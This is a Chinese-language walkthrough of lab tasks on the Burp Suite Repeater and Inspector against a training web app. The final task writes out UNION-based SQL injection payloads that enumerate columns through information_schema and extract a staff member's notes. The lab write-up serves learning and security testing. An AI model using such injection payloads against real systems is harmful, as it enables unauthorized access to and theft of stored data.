## task2
### REPEATER
 中繼器允許我們隨意製作和/或將攔截的請求中繼到目標。    
 我們可以獲取 Proxy 中捕獲的請求，對其進行編輯，然後根據需要多次重複發送相同的請求。     
## task3
在proxy中可以用 ctrl + r 發送到repeater
## task4
響應框上有4個選項
```
pretty：這是默認選項。它採用原始響應並嘗試稍微美化它，使其更易於閱讀。
Raw：來自服務器的純粹的、未經美化的響應。
hex：此視圖獲取原始響應並為我們提供它的字節視圖 - 如果響應是二進製文件，則特別有用。
render：渲染視圖渲染頁面，就像它出現在瀏覽器中一樣。雖然沒有巨大的因為使用中繼器時，我們通常會感興趣的源代碼是有用的，這仍然是一個巧妙的花招。
```
## task5
### Inspector 
 可用於 Proxy 和 Repeater。在這兩種情況下，它都出現在窗口的最右側，並為我們提供了請求和響應中的組件列表        
 請求部分幾乎總是可以更改，允許我們添加、編輯和刪除項目。例如，在請求屬性部分，我們可以編輯請求中處理位置、方法和協議的部分；例如更改我們要檢索的資源，將請求從 GET 更改為另一種HTTP方法，或者將協議從 HTTP/1 切換到 HTTP/2
## task6

## task7
/3 改成-1就會報500了
```
GET /products/-1 HTTP/1.1

Host: 10.10.250.123

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://10.10.250.123/products/

Upgrade-Insecure-Requests: 1

```
## task8

發送 GET /about/2 ' HTTP/1.1      
服務器響應“500 Internal Server Error”，表明我們成功中斷了查詢    

40行 回應了 
```
<h2>
    <code>Invalid statement: 
        <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code>
    </code>
</h2>
```
服務器告訴我們，我們試圖執行的查詢     
```
該消息告訴我們在利用此漏洞時將非常寶貴的幾件事：

我們從中選擇的數據庫表稱為 people。
該查詢正在從表中選擇五列：firstName、lastName、pfpLink、role和bio。我們可以猜測這些適合頁面的位置，這將有助於我們選擇放置響應的位置。
```
於我們知道表名和行數，我們可以使用聯合查詢people從默認數據庫中的columns表中選擇表的列名。information_schema     
* /about/0 UNION ALL SELECT `column_name`,null,null,null,null FROM `information_schema.columns` WHERE `table_name="people"` 
* 查看返回的響應，我們可以看到第一列名稱 ( id) 已插入到頁面標題中
  
* 通過使用`group_concat()`函數，我們可以將所有列名合併到一個輸出中
* /about/0 UNION ALL SELECT `group_concat(column_name)`,null,null,null,null FROM `information_schema.columns` WHERE `table_name="people"`

```
我們已成功識別出此表中的八列：id、firstName、lastName、pfpLink、role、shortRole、bio和notes


表名：people。
目標列的名稱：notes。
CEO的ID是1；這可以通過單擊/about/頁面上的 Jameson Wolfe 的個人資料並檢查 URL 中的 ID 來找到。
```

0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1